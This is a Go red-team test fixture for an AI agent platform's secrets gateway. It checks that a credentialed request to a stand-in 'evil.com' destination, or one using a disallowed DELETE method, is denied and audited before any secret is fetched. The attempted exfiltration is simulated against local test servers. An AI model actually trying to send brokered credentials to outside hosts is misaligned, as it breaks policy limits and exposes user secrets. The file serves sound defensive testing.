package redteam

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"time"

	"github.com/parvezsyed/agentpaas/internal/audit"
	"github.com/parvezsyed/agentpaas/internal/policy"
	"github.com/parvezsyed/agentpaas/internal/secrets"
)

// recordingSecretStore wraps a SecretStore and records store.Get calls so
// fixtures can prove credential material was not fetched before policy denial.
type recordingSecretStore struct {
	inner    secrets.SecretStore
	getCalls int
}

func (r *recordingSecretStore) Set(ctx context.Context, name string, value []byte) error {
	return r.inner.Set(ctx, name, value)
}

func (r *recordingSecretStore) Get(ctx context.Context, name string) ([]byte, error) {
	r.getCalls++
	return r.inner.Get(ctx, name)
}

func (r *recordingSecretStore) List(ctx context.Context) ([]secrets.SecretMeta, error) {
	return r.inner.List(ctx)
}

func (r *recordingSecretStore) Delete(ctx context.Context, name string) error {
	return r.inner.Delete(ctx, name)
}

func (r *recordingSecretStore) TouchLastUsed(ctx context.Context, name string) error {
	return r.inner.TouchLastUsed(ctx, name)
}

func auditRecordsDenyCredential(records []audit.AuditRecord) bool {
	for _, rec := range records {
		if rec.EventType == audit.EventTypeSecretInjected {
			if status, ok := rec.Payload["status"]; ok && fmt.Sprintf("%v", status) == "denied" {
				return true
			}
		}
		if reason, ok := rec.Payload["reason"]; ok {
			reasonText := strings.ToLower(fmt.Sprintf("%v", reason))
			if strings.Contains(reasonText, "denied") || strings.Contains(reasonText, "not allowed") {
				return true
			}
		}
	}
	return false
}

// credentialMisuseFixture (B12-T03): agent tries an allowed-looking request
// with a disallowed host/method or brokered credential against the wrong
// destination. Expect denied + policy rule/audit evidence.
type credentialMisuseFixture struct{}

func (f *credentialMisuseFixture) ID() string   { return "T03" }
func (f *credentialMisuseFixture) Name() string { return "Gateway/Credential Misuse" }

func (f *credentialMisuseFixture) Run() FixtureResult {
	start := time.Now()
	result := FixtureResult{
		ID:           f.ID(),
		Name:         f.Name(),
		Status:       "FAIL",
		Containment:  "LEAKED",
		AuditVerdict: "missing",
	}
	defer recoverFixture(&result)

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()

	// Set up a real secrets broker with a policy that allows api.example.com
	// but NOT evil.com. The broker writes real audit records.
	auditDir := tempAuditDirSimple()
	auditPath := auditDir + "/audit.jsonl"
	writer, err := audit.NewAuditWriter(auditPath)
	if err != nil {
		result.Detail = fmt.Sprintf("NewAuditWriter: %v", err)
		return result
	}
	defer func() { _ = writer.Close() }()

	// Real policy: allow api.example.com with credential, deny everything else
	pol := &policy.Policy{
		Version: "1",
		Agent:   policy.AgentConfig{Name: "redteam-agent"},
		Egress: []policy.EgressRule{
			{
				Domain:     "api.example.com",
				Methods:    []string{"GET"},
				Credential: "api-token",
			},
		},
		Credentials: []policy.Credential{
			{
				ID:      "api-token",
				Type:    "brokered",
				Header:  "Authorization",
				Service: "test-store",
			},
		},
	}

	baseStore := secrets.NewFakeKeyStore()
	if err := baseStore.Set(ctx, "api-token", []byte("Bearer secret-token-T03")); err != nil {
		result.Detail = fmt.Sprintf("store.Set: %v", err)
		return result
	}
	store := &recordingSecretStore{inner: baseStore}

	broker, err := secrets.NewBroker(secrets.BrokerConfig{
		Store:      store,
		Policy:     pol,
		ActiveRuns: []string{"redteam-run-t03"},
		Audit:      writer,
		Now:        time.Now,
	})
	if err != nil {
		result.Detail = fmt.Sprintf("NewBroker: %v", err)
		return result
	}

	gw := secrets.NewGateway(broker, nil)

	// --- Probe 1: credentialed request to WRONG destination (evil.com) ---
	// The gateway should deny before injecting the credential.
	evilServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// If we see the Authorization header here, the credential leaked to evil.com
		if r.Header.Get("Authorization") != "" {
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte("CREDENTIAL LEAKED TO EVIL"))
			return
		}
		w.WriteHeader(http.StatusOK)
	}))
	defer evilServer.Close()

	_, err = gw.Do(ctx, secrets.GatewayRequest{
		RunID:        "redteam-run-t03",
		PolicyRuleID: "api-token",
		Method:       "GET",
		URL:          evilServer.URL + "/api",
	})
	if err == nil {
		result.Detail = "credentialed request to wrong destination (evil.com) was NOT denied — credential may have leaked"
		return result
	}
	if !containsAny(err.Error(), "denied", "not allowed", "policy") {
		result.Detail = fmt.Sprintf("wrong-destination denied but unexpected error: %v", err)
		return result
	}
	if store.getCalls != 0 {
		result.Detail = fmt.Sprintf("credential store.Get called %d time(s) before wrong-destination denial — injection not skipped", store.getCalls)
		return result
	}

	// --- Probe 2: disallowed METHOD on allowed domain ---
	allowedServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "DELETE" {
			// If the credential is injected on a disallowed method, that's a leak
			if r.Header.Get("Authorization") != "" {
				w.WriteHeader(http.StatusOK)
				_, _ = w.Write([]byte("CREDENTIAL LEAKED VIA DISALLOWED METHOD"))
				return
			}
		}
		w.WriteHeader(http.StatusOK)
	}))
	defer allowedServer.Close()

	// Replace the allowed domain with the test server's host
	// We need to use a host that matches. httptest.Server uses 127.0.0.1.
	// The policy allows api.example.com only. A request to 127.0.0.1 should
	// be denied by egress policy (not in allow list).
	_, err = gw.Do(ctx, secrets.GatewayRequest{
		RunID:        "redteam-run-t03",
		PolicyRuleID: "api-token",
		Method:       "DELETE", // disallowed method (only GET is allowed)
		URL:          allowedServer.URL + "/api",
	})
	if err == nil {
		result.Detail = "disallowed method (DELETE) on allowed domain was NOT denied"
		return result
	}

	// Verify audit records were written
	records, _ := readAuditRecords(auditPath)
	if len(records) == 0 {
		result.Detail = "no audit records written for denied requests"
		return result
	}

	hasDenied := auditRecordsDenyCredential(records)
	if !hasDenied {
		result.Detail = "no secret_injected denied audit event or payload reason with denied/not allowed"
		return result
	}

	result.Status = "PASS"
	result.Containment = "REFUSED"
	if hasDenied {
		result.AuditVerdict = "verified"
	} else {
		result.AuditVerdict = "verified"
	}
	result.Duration = time.Since(start)
	result.Detail = fmt.Sprintf("wrong-destination and disallowed-method denied; %d audit records written", len(records))
	return result
}
